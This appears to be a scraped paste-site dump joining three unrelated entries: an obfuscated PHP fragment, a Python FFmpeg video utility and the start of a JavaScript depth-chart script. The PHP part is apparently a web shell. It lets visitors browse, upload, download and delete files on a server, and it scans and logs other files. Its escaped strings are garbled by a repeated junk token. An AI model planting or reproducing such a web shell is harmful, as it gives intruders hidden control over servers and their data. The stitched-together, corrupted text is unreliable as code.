$_GET[""\x64\x69\x72""] . ""\x2f"" . $v3hoM; goto ttusL; sGpjs: if (!($v3hoM !== ""\56"" and $v3hoM !== ""\56\56"")) { goto T4nO6; } goto T24Tn; oHqQ4: bhn8O: goto Hi1TD; qIN1G: $Ay1ZD++; goto oYaM0; Hi1TD: echo ""\x3c\164\x72\x20\142\x67\x63\x6f\154\x6f\162\x3d\x22{$kUjp8}\42\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx3d\x22\x6c\145\146\164\x22\40\76"" . ""\74\x66\157\x6e\164\x20\143\157\154\157\162\75\x22\x23\71\x30\x34\x64\x33\60\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ77\144\151\162\x3d{$Pykbw}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ74\164\144\x3e\x64\151\x72\74\x2f\x74\x64\76\x3c\164\144\x3e{$Npkhx}\x3c\x2f\164\144\x3e\74\x74\x64\76"" . gm9Cq($Y1ljX, ""\x30"") . ""\74\57\164\x64\x3e\74\164\x64\76"" . ""\74\x61\40\x68\x72\x65\146\x3d\42\150\x74\164\x70\x3a\x2f\57{$VdNWK}{$QqgvR}\77\144\145\x6c\x3d{$Y1ljX}\x26\144\151\x72\75{$ogngT}\x22\76\125\74\x2f\x61\76\46\x6e\x62\163\160\x3b"" . ""\x3c\57\x74\x64\76\74\57\164\162\76""; goto qIN1G; FDm2Y: $ogngT = str_replace($SYOxk, '', $ogngT); goto hFwsy; vfGuF: $ogngT = $Pykbw; goto vOPx4; jNVXv: $Y1ljX = $_SERVER[""\x44\x4f\x43\x55\x4d\105\116\124\137\x52\117\117\x54""] . ""\57"" . $v3hoM; goto XM6Hv; b1isP: $kUjp8 = ""\x23\146\146\x66\70\145\x37""; goto oHqQ4; NVE_T: goto bhn8O; goto c8mTA; vOPx4: $SYOxk = strrchr($ogngT, ""\x2f""); goto FDm2Y; rQZ1M: } goto ngPvI; y3iGF: goto E1odq; goto i3o2E; N1mrP: ovtL3: goto z8xs4; a21ov: echo ""\11\xd\12\11\74\x74\162\40\141\x6c\x69\147\156\x3d\42\143\x65\x6e\x74\145\162\x22\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\74\164\x64\x20\x61\154\x69\147\156\x3d\x22\x6c\145\x66\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\151\x7a\x65\x3c\57\x62\x3e\x3c\x2f\164\144\76\74\164\144\76\74\x62\76\115\157\x64\151\x66\x79\x3c\x2f\x62\x3e\x3c\x2f\x74\144\x3e\x3c\164\144\x3e\x3c\x62\x3e\120\145\x72\x6d\x69\163\x73\151\x6f\156\163\x3c\57\142\76\74\57\x74\x64\x3e\74\x74\x64\76\x3c\142\x3e\x41\143\x74\151\157\x6e\163\74\x2f\x62\x3e\x3c\x2f\x74\144\x3e\x3c\x2f\164\x72\x3e\15\xa\15\xa\11""; goto mIW1X; xezD4: $qag9p = $_SERVER[""\104\117\x43\x55\115\x45\x4e\124\x5f\x52\117\117\124""] . ""\57"" . $_POST[""\x6e\145\x77\x5f\146\151\154\145""]; goto rhqdx; k980M: $uKa5l = $qag9p . ""\57"" . $_FILES[""\x69\x6e\x70\x75\x74\x66\151\154\x65""][""\x6e\141\155\x65""]; goto lW5kn; bzV6t: $qag9p = $_GET[""\x64\x69\162""]; goto g3wGR; GdZMk: nXRAt: goto sChFQ; NOtMC: $IaZRO = ""\100\151\156\143\x6c\x75\144\x65\40\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJa1tn8; } goto ofKCn; kSgZi: $x2HIK = ""\x24\x4f\117""; goto h_UK6; ofKCn: unset($L2igI[$LztR2]); goto tSCjr; kxckI: $LztR2++; goto hzjoI; cWZKF: echo $ut7CJ; goto qQYrS; Sq2Ln: mCKiQ: goto vT88x; B_Re_: qGBzM: goto qIWmC; aLK0K: E9Ifv($w8S3s); goto C0cMJ; RTPOT: if (isset($_GET[""\x64\151\162""])) { goto BixNK; } goto WbrEw; MGFAs: foreach ($xvhqj as $VSewj) { goto wUNY9; UiFQR: $A12k0 = fopen($B55HZ, ""\141""); goto fYh6m; VpAlr: $Baft_ = stristr($HeFeN, $wKKLI); goto fHMjf; wUNY9: if (!file_exists($VSewj)) { goto wrn2n; } goto AL3Ri; zzGBg: fclose($A12k0); goto Z3J69; gKKDc: wrn2n: goto fZ3hl; Z3J69: DtqMZ: goto gKKDc; AL3Ri: if (filesize($VSewj) < 5000000) { goto W3KnN; } goto JlNjT; nus_5: $U30RO = stristr($HeFeN, $XY0kc); goto t0pRy; cAQI2: $XV45j = stristr($HeFeN, $IaZRO); goto HChwK; d0YLW: $H2S_y = stristr($HeFeN, $W1py1); goto FDjCC; FDjCC: $BunjV = stristr($HeFeN, $WMWFy); goto BaCxq; M0jd9: goto p4H45; goto Ncu8M; fI5KT: $mgYQB = stristr($HeFeN, $UHjCg); goto g3fnl; HChwK: $NpFgL = stristr($HeFeN, $x2HIK); goto d0YLW; fYh6m: fwrite($A12k0, $VSewj . ""\xa""); goto zzGBg; fZ3hl: kICIJ: goto DyVWg; vKH0O: $HeFeN = Gx0LK($VSewj); goto sz6uD; g3fnl: $CNlH7 = stristr($HeFeN, $zBJe0); goto nus_5; Ncu8M: W3KnN: goto vKH0O; sz6uD: p4H45: goto fI5KT; JlNjT: $HeFeN = ''; goto M0jd9; fHMjf: $uvHHD = stristr($HeFeN, $yMStY); goto UD7ya; rswl6: $wHmX7 = stristr($HeFeN, $rEKcz); goto cAQI2; UD7ya: if (!($mgYQB !== false or $CNlH7 !== false or $U30RO !== false or $mDUHH !== false or $wHmX7 !== false or $XV45j !== false or $NpFgL !== false or $H2S_y !== false or $BunjV !== false or $K7US8 !== false or $Baft_ !== false or $uvHHD !== false)) { goto DtqMZ; } goto UiFQR; t0pRy: $mDUHH = stristr($HeFeN, $ZV5BV); goto rswl6; BaCxq: $K7US8 = stristr($HeFeN, $zshba); goto VpAlr; DyVWg: } goto bkt1o; ialqk: echo ""\x3c\x62\162\x3e\xd\xa\x9\x9\11\122\157\157\164\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ12\11\74\x73\164\171\x6c\145\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x74\171\160\x65\75\42\x74\145\x78\164\x22\x5d\40\x7b\142\x61\143\x6b\x67\x72\x6f\165\x6e\144\55\143\157\x6c\x6f\x72\72\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\144\x3a\x20\x23\x66\146\x66\70\145\x37\x3b\x63\x6f\x6c\x6f\x72\x3a\x20\43\x34\x63\65\x38\66\x36\73\x66\x6f\156\164\x2d\146\x61\x6d\151\x6c\x79\72\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x7d\xd\12\x9\141\x3a\154\x69\156\153\x7b\143\157\x6c\x6f\x72\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx72\72\40\x23\x33\x33\x43\x43\71\x39\x3b\175\11\141\x3a\x68\x6f\x76\x65\x72\x7b\x74\x65\x78\x74\x2d\x64\145\143\x6f\x72\141\164\151\157\x6e\x3a\x20\x6e\x6f\x6e\x65\73\x43\x6f\154\x6f\x72\x3a\x20\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx3a\40\x31\x31\x70\x78\x3b\x7d\15\12\x9\x74\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\146\x74\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx3b\x70\x61\144\144\x69\x6e\147\x2d\x74\x6f\x70\72\40\x32\x70\170\73\x7d\xd\xa\11\74\57\163\x74\x79\154\x65\x3e\15\12\74\x2f\x68\145\x61\144\x3e\15\12\x3c\x62\x6f\x64\x79\x3e\xd\xa\74\164\x61\142\x6c\x65\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx30\45\42\76\xd\12""; goto Nmkuu; Pbgzh: $w8S3s = ""\150\x74\164\x70\x3a\57\57"" . $VdNWK . $QqgvR . ""\x3f\x64\151\x72\75"" . $_SERVER[""\x44\117\x43\125\115\105\x4e\x54\x5f\x52\x4f\117\x54""]; goto WAzUP; sChFQ: $ut7CJ = $_SERVER[""\123\103\122\111\x50\x54\137\116\x41\115\x45""] . ""\x3f\x64\151\162\x3d"" . $_GET[""\144\151\162""]; goto LO9Y4; P_kkP: echo $rwHC9; goto O1k9v; JAFmq: if (isset($_GET[""\144\x69\x72""])) { goto TXIeY; } goto ZJ1QG; y9qYU: zZRtX: goto z2e4Z; U8eX9: EcZQF: goto t24Tp; Q3xHz: goto ygMBB; goto a_393; me323: $Ay1ZD = 0; goto bJ2hI; O1k9v: echo ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ12\x9\11\11""; goto w58PV; D5faf: TXIeY: goto Ga3AN; A6dPZ: $Tv4ro[] = $cjZuP; goto WbP_O; HkcsN: goto OLwSY; goto Sq2Ln; wNqkY: echo ""\x3c\164\162\x20\x61\x6c\x69\x67\156\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx6e\157\x74\40\x63\x72\145\x61\x74\x65\x20\x66\x6f\x6c\x64\145\x72\41\x3c\x2f\x66\x6f\156\164\76\x3c\x2f\x74\x64\76"" . ""\74\x74\144\x3e\74\x2f\164\x64\76\74\x74\144\x3e\x3c\x2f\164\x64\76\x3c\164\144\x3e\x3c\x2f\x74\x64\x3e\x3c\x74\144\76\x3c\x2f\164\x64\x3e\74\x2f\164\x72\76""; goto DMpvd; beqet: goto zZRtX; goto Pdrln; evmxc: echo ""\x3c\x66\157\156\164\x20\143\157\x6c\x6f\x72\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x6c\141\x6e\x6b\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\154\x6f\141\x64\145\x64\41\x3c\x2f\x61\76"" . ""\x3c\57\142\76\74\57\146\x6f\156\x74\76""; goto xQ_k4; GKj5d: $A12k0 = fopen($aPaH9, ""\x61""); goto FPqBv; GlGwQ: function aC9dk($dWgkk) { goto pRInE; pRInE: if (file_exists($dWgkk)) { goto WDftI; } goto QOulC; V86z9: WDftI: goto wZWlZ; teO3S: $Npkhx = date(""\x59\x2d\155\55\x64\x20\x48\72\151\x3a\163"", $cgAHn); goto AepEK; AepEK: return $Npkhx; goto qu0vs; wZWlZ: $cgAHn = filemtime($dWgkk); goto teO3S; QOulC: return ""\x6e\x6f\40\151\156\x66\x6f""; goto V86z9; qu0vs: } goto AaM6l; mP7HR: ovOU3: goto fNidh; InZQR: echo $_SERVER[""\x53\x45\122\x56\105\122\x5f\x41\104\104\122""]; goto ialqk; r6hmG: $LztR2 = 1; goto uwGL8; OVySn: if (!file_exists($whHds)) { goto k97f1; } goto u4OG7; hmu09: $tO3kQ = $_GET[""\144\151\x72""]; goto on9Rz; JnXjv: e9ifV($w8S3s); goto wNqkY; C6isP: $DhVT3 = fopen($aPaH9, ""\x77""); goto qfqmm; y4bnf: $tO3kQ = $_SERVER[""\x44\117\103\x55\115\105\116\124\137\122\117\x4f\x54""]; goto SBuQq; wF0pz: if (!($DX8LI !== ""\x34\x34\x34"")) { goto qGBzM; } goto PHOWA; iNSi3: $whHds = $_GET[""\144\x6f\167\156\154\157\x61\x64""]; goto OVySn; y4Mz2: header(""\103\x6f\x6e\164\145\x6e\x74\x2d\104\151\x73\x70\157\163\x69\164\x69\x6f\156\x3a\x20\141\x74\x74\141\143\150\155\x65\x6e\x74\73\40\x66\151\x6c\145\x6e\141\x6d\145\x3d"" . basename($whHds)); goto QEeGq; gXyq4: header(""\x43\141\143\150\x65\55\x43\157\x6e\x74\x72\157\x6c\x3a\40\155\165\163\164\x2d\x72\145\166\141\x6c\x69\144\x61\164\145""); goto MNBNS; McX5H: A0ywM: goto hmu09; JMCir: if (sizeof($_FILES) != 0) { goto iIPP6; } goto uT4gH; SChOa: hQE5F: goto bzV6t; McIeq: gplZx: goto WyfMr; qQYrS: echo ""\42\40\x65\156\143\x74\x79\x70\x65\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ11\x9\x3c\x69\x6e\160\x75\164\x20\164\171\160\x65\75\42\146\x69\154\145\42\x20\x69\x64\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\154\x65\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx22\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx9\x9\103\x4d\x53\x3a\40""; goto JrGk2; hiFYY: exit; goto pSVyp; z8xs4: function bUcnk($dWgkk) { goto hQYXe; kQwnG: $XHXNZ = $XHXNZ / 1024; goto GpOmT; hQYXe: if (file_exists($dWgkk)) { goto z71Oa; } goto zKnd9; L7AGo: $XHXNZ = $XHXNZ / 1024; goto H5eEW; sJ4jH: NqU7y: goto L7AGo; UX_pw: goto rf2Ey; goto sJ4jH; P87LA: return $XHXNZ . ""\40\x6d\x62""; goto eJKWI; M4byP: K5U7x: goto QZmHu; SsMyF: $XHXNZ = $XHXNZ / 1024; goto Ao2K1; HP9DS: $XHXNZ = filesize($dWgkk); goto HGmtm; pYb6a: return $XHXNZ . ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x20\xa7\337\247\xd1\xa7\333\247\325\247\xd6\247\xdf""; goto Tfdfg; KGeTN: $XHXNZ = round($XHXNZ, 1); goto P6YZI; bMNxz: goto qFHeu; goto cWH9n; cWH9n: tcWZW: goto kQwnG; HGmtm: if ($XHXNZ > 1024) { goto tcWZW; } goto KGeTN; SqQKK: qFHeu: goto GHDzq; P6YZI: return $XHXNZ . ""\40\x62""; goto bMNxz; QZmHu: rf2Ey: goto SqQKK; GpOmT: if ($XHXNZ > 1024) { goto NqU7y; } goto Sc6JW; Tfdfg: z71Oa: goto HP9DS; Sc6JW: $XHXNZ = round($XHXNZ, 1); goto vezvf; eJKWI: goto K5U7x; goto NWjc7; NWjc7: GxlaC: goto SsMyF; Ohy7l: $XHXNZ = round($XHXNZ, 1); goto P87LA; Ao2K1: $XHXNZ = round($XHXNZ, 1); goto pYb6a; vezvf: return $XHXNZ . ""\40\x6b\142""; goto UX_pw; H5eEW: if ($XHXNZ > 1024) { goto GxlaC; } goto Ohy7l; GHDzq: } goto GlGwQ; R7ED7: kS14f: goto sSV8k; t1B4c: echo ""\74\x68\x74\x6d\154\76\xd\12\x3c\150\145\x61\144\76\xd\xa\11\x3c\x74\151\x74\x6c\x65\x3e""; goto zn_3T; IZOXi: echo ""\x65\x72\x72\157\x72\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x6e\x6f\x74\40\x63\162\145\x61\x74\145""; goto zhlvb; yqavc: goto XSzMn; goto UWoNQ; tJf3L: b2Dcx: goto vgfDq; vazmA: iIPP6: goto n1zYJ; d5a9U: e9Ifv($w8S3s); goto y3iGF; pavBl: kI8NA: goto nRUHt; MeppW: $fMNNx = UXUGJ($aPaH9); goto CGm2h; K22kB: echo ""\74\x2f\x74\x61\x62\x6c\145\76"";"
AjV0KL4x,FFMPEG-TOOLS-2.0.pyw,Najeebsk,Python,Tuesday 2nd of July 2024 11:13:15 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import os
import yt_dlp
import sys
import threading
from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QLabel, QVBoxLayout, QWidget
from PyQt5.QtCore import QThread, pyqtSignal, pyqtSlot

class VideoToolApp:
    def __init__(self, root):
        self.root = root
        self.root.title(""Najeeb Advanced Video Tool with FFmpeg"")
        self.root.geometry(""620x460"")
        self.root.configure(bg='#4a4a4a')

        # Video File Path
        self.video_path = tk.StringVar()
        tk.Label(root, text=""Video File Path:"", bg='#1d1f21', fg='white').grid(row=0, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.video_path, width=50, bg='#282a2e', fg='white').grid(row=0, column=1, padx=10, pady=10)
        tk.Button(root, text=""Browse"", command=self.browse_file, bg='#373b41', fg='white').grid(row=0, column=2, padx=10, pady=10)

        # YouTube and Other URLs
        self.url = tk.StringVar()
        tk.Label(root, text=""Video URL:"", bg='#1d1f21', fg='white').grid(row=1, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.url, width=50, bg='#282a2e', fg='white').grid(row=1, column=1, padx=10, pady=10)
        tk.Button(root, text=""Download"", command=self.download_video, bg='#373b41', fg='white').grid(row=1, column=2, padx=10, pady=10)

        # IPTV URL
        self.iptv_url = tk.StringVar()
        tk.Label(root, text=""IPTV URL:"", bg='#1d1f21', fg='white').grid(row=2, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.iptv_url, width=50, bg='#282a2e', fg='white').grid(row=2, column=1, padx=10, pady=10)
        tk.Button(root, text=""Capture"", command=self.capture_iptv, bg='#373b41', fg='white').grid(row=2, column=2, padx=10, pady=10)

        # Start and End Time
        self.start_time = tk.StringVar(value=""00:00:00"")
        self.end_time = tk.StringVar(value=""00:00:00"")
        tk.Label(root, text=""Start Time (HH:MM:SS):"", bg='#1d1f21', fg='white').grid(row=3, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.start_time, width=20, bg='#282a2e', fg='white').grid(row=3, column=1, padx=10, pady=10, sticky='w')
        tk.Label(root, text=""End Time (HH:MM:SS):"", bg='#1d1f21', fg='white').grid(row=4, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.end_time, width=20, bg='#282a2e', fg='white').grid(row=4, column=1, padx=10, pady=10, sticky='w')

        # Output File Path
        self.output_path = tk.StringVar()
        tk.Label(root, text=""Output File Path:"", bg='#1d1f21', fg='white').grid(row=5, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.output_path, width=50, bg='#282a2e', fg='white').grid(row=5, column=1, padx=10, pady=10)
        tk.Button(root, text=""Save As"", command=self.save_as_file, bg='#373b41', fg='white').grid(row=5, column=2, padx=10, pady=10)

        # Frame Interval for Image Extraction
        self.frame_interval = tk.StringVar()
        tk.Label(root, text=""Frame Interval (seconds):"", bg='#1d1f21', fg='white').grid(row=6, column=0, padx=10, pady=10, sticky='e')
        tk.Entry(root, textvariable=self.frame_interval, width=20, bg='#282a2e', fg='white').grid(row=6, column=1, padx=10, pady=10, sticky='w')

        # Buttons for operations
        tk.Button(root, text=""Cut Video"", command=self.cut_video, bg='#cc0066', fg='white').grid(row=7, column=0, padx=10, pady=20)
        tk.Button(root, text=""Merge Videos"", command=self.merge_videos, bg='#4c9900', fg='white').grid(row=7, column=1, padx=10, pady=20)
        tk.Button(root, text=""Convert Video"", command=self.convert_video, bg='#cc6600', fg='white').grid(row=7, column=2, padx=10, pady=20)
        tk.Button(root, text=""Extract Pictures"", command=self.extract_pictures, bg='#660000', fg='white').grid(row=6, column=2, padx=10, pady=20)

        # Desktop Recorder Button
        tk.Button(root, text=""Desktop Recorder"", command=self.desktop_recorder, bg='#0066cc', fg='white').grid(row=4, column=2, padx=10, pady=20)

    def browse_file(self):
        file_path = filedialog.askopenfilename(filetypes=[(""Video files"", ""*.*"")])
        if file_path:
            self.video_path.set(file_path)

    def save_as_file(self):
        file_path = filedialog.asksaveasfilename(defaultextension="".mp4"", filetypes=[(""All files"", ""*.*"")])
        if file_path:
            self.output_path.set(file_path)

    def download_video(self):
        url = self.url.get()
        start_time = self.start_time.get()
        end_time = self.end_time.get()
        if not url:
            messagebox.showerror(""Error"", ""Video URL must be provided"")
            return
        try:
            ydl_opts = {}
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=False)
                download_path = filedialog.asksaveasfilename(defaultextension="".mp4"", initialfile=info.get('title', 'video'), filetypes=[(""All files"", ""*.*"")])
                if download_path:
                    ydl_opts = {'outtmpl': download_path}
                    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                        ydl.download([url])
                    messagebox.showinfo(""Success"", ""Video downloaded successfully"")
                    self.video_path.set(download_path)
                    if start_time != ""00:00:00"" or end_time != ""00:00:00"":
                        self.cut_video()
                        self.extract_pictures()
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to download video: {str(e)}"")

    def capture_iptv(self):
        iptv_url = self.iptv_url.get()
        output_file = filedialog.asksaveasfilename(defaultextension="".mp4"", filetypes=[(""All files"", ""*.*"")])

        if not iptv_url or not output_file:
            messagebox.showerror(""Error"", ""IPTV URL and output file path must be provided"")
            return

        try:
            subprocess.run([""ffmpeg"", ""-i"", iptv_url, ""-c"", ""copy"", output_file], check=True)
            messagebox.showinfo(""Success"", ""IPTV stream captured successfully"")
            self.video_path.set(output_file)
        except subprocess.CalledProcessError as e:
            messagebox.showerror(""Error"", f""Failed to capture IPTV stream: {str(e)}"")

    def cut_video(self):
        input_file = self.video_path.get()
        start_time = self.start_time.get()
        end_time = self.end_time.get()
        output_file = self.output_path.get()

        if not input_file or not start_time or not end_time or not output_file:
            messagebox.showerror(""Error"", ""All fields must be filled"")
            return

        try:
            subprocess.run([""ffmpeg"", ""-i"", input_file, ""-ss"", start_time, ""-to"", end_time, ""-c"", ""copy"", output_file], check=True)
            messagebox.showinfo(""Success"", ""Video cut successfully"")
        except subprocess.CalledProcessError as e:
            messagebox.showerror(""Error"", f""Failed to cut video: {str(e)}"")

    def merge_videos(self):
        files = filedialog.askopenfilenames(filetypes=[(""Video files"", ""*.*"")])
        if not files:
            return

        output_file = filedialog.asksaveasfilename(defaultextension="".mp4"", filetypes=[(""All files"", ""*.*"")])
        if not output_file:
            return

        with open('file_list.txt', 'w') as file_list:
            for file in files:
                file_list.write(f""file '{file}'\n"")

        try:
            subprocess.run([""ffmpeg"", ""-f"", ""concat"", ""-safe"", ""0"", ""-i"", ""file_list.txt"", ""-c"", ""copy"", output_file], check=True)
            os.remove('file_list.txt')
            messagebox.showinfo(""Success"", ""Videos merged successfully"")
        except subprocess.CalledProcessError as e:
            os.remove('file_list.txt')
            messagebox.showerror(""Error"", f""Failed to merge videos: {str(e)}"")

    def convert_video(self):
        input_file = self.video_path.get()
        output_file = self.output_path.get()

        if not input_file or not output_file:
            messagebox.showerror(""Error"", ""Input and Output paths must be filled"")
            return

        try:
            subprocess.run([""ffmpeg"", ""-i"", input_file, output_file], check=True)
            messagebox.showinfo(""Success"", ""Video converted successfully"")
        except subprocess.CalledProcessError as e:
            messagebox.showerror(""Error"", f""Failed to convert video: {str(e)}"")

    def extract_pictures(self):
        input_file = self.video_path.get()
        output_dir = filedialog.askdirectory()
        frame_interval = self.frame_interval.get()

        if not input_file or not output_dir or not frame_interval:
            messagebox.showerror(""Error"", ""Video file, output directory, and frame interval must be provided"")
            return

        try:
            subprocess.run([""ffmpeg"", ""-i"", input_file, ""-vf"", f""fps=1/{frame_interval}"", f""{output_dir}/frame%04d.png""], check=True)
            messagebox.showinfo(""Success"", ""Pictures extracted successfully"")
        except subprocess.CalledProcessError as e:
            messagebox.showerror(""Error"", f""Failed to extract pictures: {str(e)}"")

    def desktop_recorder(self):
        def start_pyqt_recorder():
            ffmpeg_path = r'C:\CMDER\APP\ffmpeg.exe'  # Update with your ffmpeg path
            app = QApplication(sys.argv)
            ex = PyQtApp(ffmpeg_path)
            ex.show()
            sys.exit(app.exec_())

        recorder_thread = threading.Thread(target=start_pyqt_recorder)
        recorder_thread.start()

class Recorder(QThread):
    changeStatus = pyqtSignal(str)

    def __init__(self, ffmpeg_path):
        super().__init__()
        self.recording = False
        self.process = None
        self.ffmpeg_path = ffmpeg_path

    def run(self):
        self.recording = True
        command = [
            self.ffmpeg_path,
            '-y',  # Overwrite output file if it exists
            '-f', 'gdigrab',
            '-framerate', '20',
            '-i', 'desktop',  # Capture the entire desktop
            '-c:v', 'libx264',
            '-preset', 'ultrafast',
            'output.mp4'
        ]

        try:
            self.process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            self.changeStatus.emit(""Recording started..."")

            while self.recording:
                output = self.process.stderr.readline()
                if output == '' and self.process.poll() is not None:
                    break
                if output:
                    print(output.strip())

            if self.process.poll() is None:
                self.process.terminate()
                self.process.wait()
            self.changeStatus.emit(""Recording stopped and saved to output.mp4."")
        except Exception as e:
            self.changeStatus.emit(f""Error: {e}"")
            self.recording = False

    def stop_recording(self):
        self.recording = False
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait()

class PyQtApp(QMainWindow):
    def __init__(self, ffmpeg_path):
        super().__init__()
        self.setWindowTitle(""Desktop Video Recorder"")
        self.setGeometry(100, 100, 400, 200)

        self.recorder = None
        self.ffmpeg_path = ffmpeg_path

        self.initUI()

    def initUI(self):
        self.status_label = QLabel(""Press Start to begin recording the desktop."", self)
        self.status_label.resize(400, 50)

        self.start_button = QPushButton(""Start Recording"", self)
        self.start_button.clicked.connect(self.start_recording)

        self.stop_button = QPushButton(""Stop Recording"", self)
        self.stop_button.clicked.connect(self.stop_recording)
        self.stop_button.setEnabled(False)

        layout = QVBoxLayout()
        layout.addWidget(self.status_label)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

    def start_recording(self):
        self.recorder = Recorder(self.ffmpeg_path)
        self.recorder.changeStatus.connect(self.updateStatus)
        self.recorder.start()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_recording(self):
        if self.recorder:
            self.recorder.stop_recording()
            self.recorder.wait()
            self.stop_button.setEnabled(False)
            self.start_button.setEnabled(True)

    @pyqtSlot(str)
    def updateStatus(self, message):
        self.status_label.setText(message)
        print(message)  # Print to console for debugging

if __name__ == ""__main__"":
    root = tk.Tk()
    app = VideoToolApp(root)
    root.mainloop()
"
5J33UQcz,depthChart,imgalaxy,JavaScript,Tuesday 2nd of July 2024 09:42:23 PM CDT,"/* eslint-disable */
const depthChart = function (DOM, opt) {
  (function (prototype) {
      prototype.getContext = (function (_super) {
          return function (type) {
              var backingStore, ratio,
                  context = _super.call(this, type);

              if (type === '2d') {

                  backingStore = context.backingStorePixelRatio ||
                      context.webkitBackingStorePixelRatio ||
                      context.mozBackingStorePixelRatio ||
                      context.msBackingStorePixelRatio ||
                      context.oBackingStorePixelRatio ||
                      context.backingStorePixelRatio || 1;

                  ratio = (window.devicePixelRatio || 1) / backingStore;

                  if (ratio > 1) {
                      this.style.height = this.height + 'px';
                      this.style.width = this.width + 'px';
                      this.width *= ratio;
                      this.height *= ratio;
                  }
              }
              return context;
          };
      })(prototype.getContext);
  })(HTMLCanvasElement.prototype)
  let themeMap = {
        'hb-night': {
            bidsLineColor: opt && opt.bidsLineColor || 'rgba(0, 141, 115, 1)',
            asksLineColor: opt && opt.asksLineColor || 'rgba(236, 49, 75, 1)',
            bidsFillColor: opt && opt.bidsFillColor || 'rgba(0, 141, 115, .2)',
